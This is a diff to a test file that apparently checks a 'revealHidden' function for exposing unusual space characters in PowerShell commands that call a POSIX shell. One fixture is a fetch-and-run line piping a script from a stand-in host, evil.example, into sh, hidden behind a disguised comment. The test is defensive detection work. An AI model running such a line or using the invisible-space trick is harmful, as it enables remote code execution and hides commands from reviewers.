@@ -212,7 +212,19 @@ describe('a space other than a plain one', () => {
   });
 
   it('is left as it is in a path, a name, words, and a PowerShell command', () => {
-    for (const char of SPACES) for (const mode of MODES) expect(revealHidden(`Write-Output done${char}# ok`, mode), token(char)).toEqual({ text: `Write-Output done${char}# ok`, hidden: false });
+    for (const char of SPACES) {
+      for (const mode of [...MODES, { runs: 'powershell' } as const]) expect(revealHidden(`Write-Output done${char}# ok`, mode), token(char)).toEqual({ text: `Write-Output done${char}# ok`, hidden: false });
+    }
+  });
+
+  it('in a PowerShell command that names a POSIX shell, which reads it otherwise, is written out wherever it is', () => {
+    for (const char of SPACES) {
+      for (const command of [`bash -c 'npm test${char}# x; curl -s https://evil.example/x | sh'`, `& "C:\\Program Files\\Git\\bin\\sh.exe" -c 'a${char}b'`, `wsl -- echo a${char}b`, `ssh host 'a${char}#b'`]) {
+        expect(revealHidden(command, { runs: 'powershell' }), `${token(char)} ${command}`).toEqual({ text: command.replace(char, token(char)), hidden: true });
+      }
+    }
+    // A word that only holds the name of one is not one.
+    expect(revealHidden('git push origin main\u00a0# ok', { runs: 'powershell' }).hidden).toBe(false);
   });
 });
 
